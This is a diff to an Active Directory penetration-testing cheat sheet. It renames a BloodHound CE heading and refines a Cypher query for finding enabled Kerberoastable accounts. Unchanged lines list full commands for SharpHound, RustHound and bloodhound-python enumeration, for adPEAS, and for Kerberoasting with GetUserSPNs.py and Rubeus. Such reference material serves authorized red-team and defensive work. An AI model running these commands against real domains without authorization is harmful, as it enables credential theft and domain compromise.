@@ -14,7 +14,7 @@
   - `rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z`
   - `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>`
   - `sharphound.exe -c all -d <domain>`
-- Bloodhound-ce >>> ACL || Delegation || Username
+- Bloodhound CE >>> ACL || Delegation || Username
   - `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
   - `rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)`
   - `sharphound.exe -c all -d <domain>`
@@ -42,7 +42,7 @@
 - `Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'`
 
 ## Kerberoasting >>> Hash TGS
-- `MATCH (u:User {hasspn:true})) RETURN u`
+- `MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u`
 - `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>`
 - `Rubeus.exe kerberoast`
 
